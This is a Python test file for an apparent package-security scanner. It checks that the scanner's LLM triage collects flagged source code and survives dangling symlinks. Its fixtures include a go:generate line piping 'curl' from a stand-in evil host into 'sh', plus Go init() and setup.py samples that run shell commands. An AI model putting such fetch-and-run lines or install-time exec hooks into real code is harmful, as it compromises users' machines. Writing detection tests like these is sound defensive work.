# SPDX-License-Identifier: AGPL-3.0-or-later
"""Guards for LLM-triage source gathering.

The sneaky bug this catches: a finding can flag a *file* without a specific line
(gomod init()/cgo chains aggregate all init bodies, so they set `file` but no
`line`). The source collector used to require both file AND line, so those
findings contributed no source and the model received "(no source extracted)" —
silently degrading triage quality without changing the (chain-escalated) verdict.
"""
from __future__ import annotations

from pkgsentry.adapter import Finding
from pkgsentry.llm.triage import _gather_source, _safe_rglob

_SENTINEL = "(no source extracted)"


def test_file_level_finding_includes_whole_file(tmp_path):
    """gomod-style file-level finding (file set, line=None) → whole file included."""
    d = tmp_path / "github.com" / "x" / "coBra@v1.0.0" / "cmd"
    d.mkdir(parents=True)
    (d / "helpers.go").write_text(
        'package cmd\nimport "os/exec"\nfunc init() { exec.Command("sh", "-c", "evil").Run() }\n'
    )
    finding = Finding(
        rule_id="gomod.init_exec_chain", category="gomod", severity="critical",
        confidence="high", file="github.com/x/coBra@v1.0.0/cmd/helpers.go", line=None,
        evidence="init() calls os/exec",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="gomod")
    assert src != _SENTINEL
    assert "exec.Command" in src
    assert "helpers.go" in src


def test_line_anchored_finding_includes_region(tmp_path):
    """A finding with file+line → the ±N-line region is included."""
    d = tmp_path / "mod"
    d.mkdir()
    lines = [f"// line {i}" for i in range(1, 60)]
    lines[40] = "//go:generate curl http://evil.invalid/x | sh"
    (d / "gen.go").write_text("\n".join(lines) + "\n")
    finding = Finding(
        rule_id="gomod.go_generate_exec", category="gomod", severity="critical",
        confidence="high", file="mod/gen.go", line=41, evidence="go:generate runs curl",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="gomod")
    assert "go:generate curl" in src
    assert "regions around findings" in src  # line-anchored block marker


def test_no_locatable_file_yields_sentinel(tmp_path):
    """A finding with no file at all can't be located → sentinel (the only legit case)."""
    finding = Finding(
        rule_id="metadata.lure_name", category="metadata", severity="medium",
        confidence="medium", file="", line=None, evidence="lure",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="gomod")
    assert src == _SENTINEL


def test_safe_rglob_skips_dangling_symlink_dir(tmp_path):
    """A dangling symlinked directory must not abort the walk (the crash that
    aborted triage on giant gomod monorepos: rglob's scandir raised
    FileNotFoundError mid-iteration). The real file is still found."""
    real = tmp_path / "real.go"
    real.write_text("package x\n")
    (tmp_path / "ghost").symlink_to(tmp_path / "does_not_exist", target_is_directory=True)
    found = list(_safe_rglob(tmp_path, "*.go"))
    assert real in found


def test_safe_rglob_respects_limit(tmp_path):
    """`limit` caps how many files are yielded so we never crawl a whole monorepo."""
    d = tmp_path / "m"
    d.mkdir()
    for i in range(10):
        (d / f"f{i}.go").write_text("x")
    assert len(list(_safe_rglob(tmp_path, "*.go", limit=3))) == 3


def test_gather_source_survives_dangling_symlink(tmp_path):
    """End-to-end: a dangling symlinked dir in the tree must not crash triage's
    source gathering — the flagged real file is still collected."""
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "setup.py").write_text("import os\nos.system('evil')\n")
    (tmp_path / "ghost").symlink_to(tmp_path / "missing", target_is_directory=True)
    finding = Finding(
        rule_id="installer.setup_exec", category="installer", severity="high",
        confidence="high", file="pkg/setup.py", line=None, evidence="os.system",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="pypi")
    assert "os.system" in src
